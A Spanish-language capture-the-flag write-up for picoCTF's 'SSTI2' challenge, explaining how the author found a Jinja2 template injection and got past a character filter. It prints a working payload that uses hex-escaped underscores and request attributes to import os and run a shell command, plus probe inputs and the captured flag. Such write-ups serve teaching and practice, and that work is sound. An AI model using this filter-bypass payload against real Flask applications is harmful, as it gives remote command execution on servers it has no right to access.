## RETO
SSTI2
## DESCRIPCION
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:63863/)!
## SOLUCION
Ahora, al abrir este desafío en picoCTF, podemos ver que el desafío es el mismo, pero se han realizado algunos cambios. El autor ha mencionado que ha añadido sanitización de entrada, por lo que esto probablemente significa que nuestra carga útil anterior no funcionará ahora. Al lanzar este desafío, obtenemos el mismo campo de entrada, así que lo probé de nuevo con **_{{7*'7'}}_** solo para asegurarme de que el motor de plantillas sigue siendo Jinja2 y que todavía lo está utilizando.

para que podamos ver que la entrada se está saneando, para probar qué caracteres se están saneando, ingresé {{ config }} y devolvió los datos de configuración, por lo que podemos ver que no se saneó, por lo que más adelante se usó {{ config.__class___}} ahora se estaba saneando, así que probé los símbolos usados ​​y encontré que **_ . [ ] ( ) '** se estaban saneando, intenté convertir los caracteres a hexadecimal, funcionó para _ (\x5f) pero la carga útil todavía no se estaba ejecutando correctamente, así que intenté crear otra carga útil usando una estructura diferente, así que descubrí que podemos hacer esto usando el método de solicitud, con la ayuda de chatGPT y algunos ensayos y errores finalmente creé una carga útil que funcionó.

_{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}_


¡Tenemos la bandera!
picoCTF{sst1_f1lt3r_byp4ss_63b833cd}
## NOTAS ADICIONALES
Esto aprovecha el `request`objeto para acceder a Flask `application`y sus `__globals__`funciones integradas, y luego recupera funciones integradas a través de `__getitem__`. Utiliza `__import__`para cargar el `os`módulo y llama `popen('cat flag')`para ejecutar un comando del sistema, leyendo la salida mediante `read()`.
## REFERENCIAS